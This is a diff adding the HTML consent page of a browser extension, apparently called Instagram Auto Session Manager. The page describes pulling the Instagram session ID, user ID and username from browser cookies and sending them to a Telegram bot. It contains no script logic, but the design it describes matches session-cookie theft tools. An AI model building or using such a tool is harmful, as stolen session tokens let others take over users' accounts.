@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Meta tags for proper document structure and security -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Instagram Auto Session Manager - Consent Page">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <!-- Page title -->
+    <title>Instagram Session Manager - Consent Required</title>
+    
+    <!-- Link to external CSS file for styling -->
+    <link rel="stylesheet" href="consent.css">
+    
+    <!-- Preload important resources for better performance -->
+    <link rel="preload" href="icons/icon48.png" as="image">
+    
+    <!-- Security headers -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; img-src 'self' data:;">
+</head>
+<body>
+    <!-- Main container for the entire consent page -->
+    <div class="consent-container">
+        
+        <!-- Background overlay for visual effect -->
+        <div class="background-overlay"></div>
+        
+        <!-- Main consent card -->
+        <div class="consent-card">
+            
+            <!-- Header section with extension branding -->
+            <header class="consent-header">
+                <div class="brand-section">
+                    <img src="icons/icon48.png" alt="Instagram Auto Session Manager" class="brand-logo">
+                    <div class="brand-text">
+                        <h1 class="brand-title">Instagram Auto Session Manager</h1>
+                        <p class="brand-subtitle">Session Data Detection</p>
+                    </div>
+                </div>
+                
+                <!-- Status indicator -->
+                <div class="status-indicator">
+                    <div class="status-dot active"></div>
+                    <span class="status-text">Session Detected</span>
+                </div>
+            </header>
+            
+            <!-- Main content section -->
+            <main class="consent-content">
+                
+                <!-- Detection notification -->
+                <div class="detection-notice">
+                    <div class="notice-icon">🔍</div>
+                    <div class="notice-content">
+                        <h2 class="notice-title">Instagram Session Detected</h2>
+                        <p class="notice-description">
+                            We've detected that you're logged into Instagram. This extension can extract your session data 
+                            and send it to your configured Telegram bot, but only with your explicit consent.
+                        </p>
+                    </div>
+                </div>
+                
+                <!-- What will happen section -->
+                <div class="info-section">
+                    <h3 class="section-title">
+                        <span class="section-icon">📋</span>
+                        What will happen if you consent:
+                    </h3>
+                    <ul class="info-list">
+                        <li class="info-item">
+                            <span class="item-icon">🔐</span>
+                            <div class="item-content">
+                                <strong>Extract Session Data:</strong>
+                                <span>Your Instagram session ID and user information will be extracted from browser cookies</span>
+                            </div>
+                        </li>
+                        <li class="info-item">
+                            <span class="item-icon">📱</span>
+                            <div class="item-content">
+                                <strong>Send to Telegram:</strong>
+                                <span>The extracted data will be sent to your pre-configured Telegram bot</span>
+                            </div>
+                        </li>
+                        <li class="info-item">
+                            <span class="item-icon">🗑️</span>
+                            <div class="item-content">
+                                <strong>Clear Local Data:</strong>
+                                <span>Temporary data will be cleared from the extension for security</span>
+                            </div>
+                        </li>
+                        <li class="info-item">
+                            <span class="item-icon">📝</span>
+                            <div class="item-content">
+                                <strong>Activity Logging:</strong>
+                                <span>This action will be logged for transparency (if enabled in settings)</span>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+                
+                <!-- Data preview section -->
+                <div class="data-preview-section" id="data-preview-section" style="display: none;">
+                    <h3 class="section-title">
+                        <span class="section-icon">👁️</span>
+                        Data Preview:
+                    </h3>
+                    <div class="data-preview">
+                        <div class="preview-item">
+                            <label class="preview-label">Session ID:</label>
+                            <div class="preview-value" id="preview-session-id">Loading...</div>
+                        </div>
+                        <div class="preview-item">
+                            <label class="preview-label">User ID:</label>
+                            <div class="preview-value" id="preview-user-id">Loading...</div>
+                        </div>
+                        <div class="preview-item">
+                            <label class="preview-label">Username:</label>
+                            <div class="preview-value" id="preview-username">Loading...</div>
+                        </div>
+                        <div class="preview-item">
+                            <label class="preview-label">Timestamp:</label>
+                            <div class="preview-value" id="preview-timestamp">Loading...</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Privacy and security information -->
+                <div class="privacy-section">
+                    <h3 class="section-title">
+                        <span class="section-icon">🔒</span>
+                        Privacy & Security:
+                    </h3>
+                    <div class="privacy-grid">
+                        <div class="privacy-item">
+                            <div class="privacy-icon">✅</div>
+                            <div class="privacy-text">
+                                <strong>Explicit Consent</strong>
+                                <span>No action without your approval</span>
+                            </div>
+                        </div>
+                        <div class="privacy-item">
+                            <div class="privacy-icon">🏠</div>
+                            <div class="privacy-text">
+                                <strong>Local Processing</strong>
+                                <span>Data processed in your browser</span>
+                            </div>
+                        </div>
+                        <div class="privacy-item">
+                            <div class="privacy-icon">🚫</div>
+                            <div class="privacy-text">
+                                <strong>No Third Parties</strong>
+                                <span>Data only sent to your Telegram</span>
+                            </div>
+                        </div>
+                        <div class="privacy-item">
+                            <div class="privacy-icon">🔄</div>
+                            <div class="privacy-text">
+                                <strong>Temporary Storage</strong>
+                                <span>Data cleared after transmission</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Telegram bot configuration status -->
+                <div class="config-status" id="config-status">
+                    <div class="config-item">
+                        <span class="config-label">Telegram Bot:</span>
+                        <span class="config-value" id="bot-status">Checking...</span>
+                    </div>
+                    <div class="config-item">
+                        <span class="config-label">Chat ID:</span>
+                        <span class="config-value" id="chat-status">Checking...</span>
+                    </div>
+                </div>
+                
+                <!-- Consent form -->
+                <form class="consent-form" id="consent-form">
+                    
+                    <!-- Primary consent checkbox -->
+                    <div class="consent-group primary-consent">
+                        <label class="consent-label">
+                            <input type="checkbox" id="primary-consent" name="primaryConsent" required>
+                            <span class="checkbox-custom"></span>
+                            <div class="consent-text">
+                                <strong>I understand and consent to the extraction of my Instagram session data</strong>
+                                <span class="consent-description">
+                                    I acknowledge that this extension will extract my Instagram session ID, user ID, and username 
+                                    from my browser cookies and send this information to my configured Telegram bot.
+                                </span>
+                            </div>
+                        </label>
+                    </div>
+                    
+                    <!-- Data transmission consent -->
+                    <div class="consent-group">
+                        <label class="consent-label">
+                            <input type="checkbox" id="transmission-consent" name="transmissionConsent" required>
+                            <span class="checkbox-custom"></span>
+                            <div class="consent-text">
+                                <strong>I consent to sending this data to my Telegram bot</strong>
+                                <span class="consent-description">
+                                    I confirm that the configured Telegram bot belongs to me and I want to receive 
+                                    my Instagram session data through this bot.
+                                </span>
+                            </div>
+                        </label>
+                    </div>
+                    
+                    <!-- Terms acknowledgment -->
+                    <div class="consent-group">
+                        <label class="consent-label">
+                            <input type="checkbox" id="terms-consent" name="termsConsent" required>
+                            <span class="checkbox-custom"></span>
+                            <div class="consent-text">
+                                <strong>I acknowledge the risks and responsibilities</strong>
+                                <span class="consent-description">
+                                    I understand that session IDs are sensitive data and I'm responsible for handling 
+                                    them securely. I will only use this extension with my own Instagram account.
+                                </span>
+                            </div>
+                        </label>
+                    </div>
+                    
+                    <!-- Optional settings -->
+                    <div class="optional-settings">
+                        <h4 class="optional-title">Optional Settings:</h4>
+                        
+                        <div class="consent-group optional">
+                            <label class="consent-label">
+                                <input type="checkbox" id="preview-data" name="previewData">
+                                <span class="checkbox-custom"></span>
+                                <div class="consent-text">
+                                    <strong>Show me the data before sending</strong>
+                                    <span class="consent-description">
+                                        Display the extracted data for review before transmission to Telegram.
+                                    </span>
+                                </div>
+                            </label>
+                        </div>
+                        
+                        <div class="consent-group optional">
+                            <label class="consent-label">
+                                <input type="checkbox" id="remember-choice" name="rememberChoice">
+                                <span class="checkbox-custom"></span>
+                                <div class="consent-text">
+                                    <strong>Remember my choice for this session</strong>
+                                    <span class="consent-description">
+                                        Don't ask again during this browser session (resets when browser closes).
+                                    </span>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <!-- Action buttons -->
+                    <div class="action-buttons">
+                        <button type="button" class="btn btn-secondary" id="decline-btn">
+                            <span class="btn-icon">❌</span>
+                            Decline & Close
+                        </button>
+                        <button type="button" class="btn btn-primary" id="consent-btn" disabled>
+                            <span class="btn-icon">✅</span>
+                            Give Consent & Proceed
+                        </button>
+                    </div>
+                    
+                </form>
+                
+                <!-- Additional information and links -->
+                <div class="additional-info">
+                    <div class="info-links">
+                        <button type="button" class="info-link" id="view-settings">
+                            <span class="link-icon">⚙️</span>
+                            Extension Settings
+                        </button>
+                        <button type="button" class="info-link" id="privacy-policy">
+                            <span class="link-icon">📄</span>
+                            Privacy Policy
+                        </button>
+                        <button type="button" class="info-link" id="how-it-works">
+                            <span class="link-icon">❓</span>
+                            How It Works
+                        </button>
+                    </div>
+                    
+                    <div class="disclaimer">
+                        <p class="disclaimer-text">
+                            <strong>Important:</strong> This extension is for educational and personal use only. 
+                            Always respect Instagram's Terms of Service and applicable laws. Only use with your own account.
+                        </p>
+                    </div>
+                </div>
+                
+            </main>
+            
+            <!-- Footer with extension information -->
+            <footer class="consent-footer">
+                <div class="footer-content">
+                    <p class="footer-text">
+                        Instagram Auto Session Manager v2.0.0 - 
+                        <span class="footer-link" id="about-extension">About</span>
+                    </p>
+                    <p class="footer-timestamp" id="footer-timestamp">
+                        <!-- Timestamp will be inserted by JavaScript -->
+                    </p>
+                </div>
+            </footer>
+            
+        </div>
+        
+        <!-- Loading overlay -->
+        <div class="loading-overlay" id="loading-overlay" style="display: none;">
+            <div class="loading-content">
+                <div class="loading-spinner"></div>
+                <p class="loading-text" id="loading-text">Processing...</p>
+            </div>
+        </div>
+        
+        <!-- Success overlay -->
+        <div class="success-overlay" id="success-overlay" style="display: none;">
+            <div class="success-content">
+                <div class="success-icon">✅</div>
+                <h3 class="success-title">Success!</h3>
+                <p class="success-message" id="success-message">
+                    Your Instagram session data has been successfully sent to your Telegram bot.
+                </p>
+                <button type="button" class="btn btn-primary" id="success-close">
+                    <span class="btn-icon">👍</span>
+                    Close
+                </button>
+            </div>
+        </div>
+        
+        <!-- Error overlay -->
+        <div class="error-overlay" id="error-overlay" style="display: none;">
+            <div class="error-content">
+                <div class="error-icon">❌</div>
+                <h3 class="error-title">Error</h3>
+                <p class="error-message" id="error-message">
+                    An error occurred while processing your request.
+                </p>
+                <div class="error-actions">
+                    <button type="button" class="btn btn-secondary" id="error-retry">
+                        <span class="btn-icon">🔄</span>
+                        Try Again
+                    </button>
+                    <button type="button" class="btn btn-primary" id="error-close">
+                        <span class="btn-icon">❌</span>
+                        Close
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+    
+    <!-- Hidden elements for data storage -->
+    <div id="session-data" style="display: none;"></div>
+    <div id="extension-settings" style="display: none;"></div>
+    
+    <!-- Link to external JavaScript file -->
+    <script src="consent.js"></script>
+</body>
+</html>
+
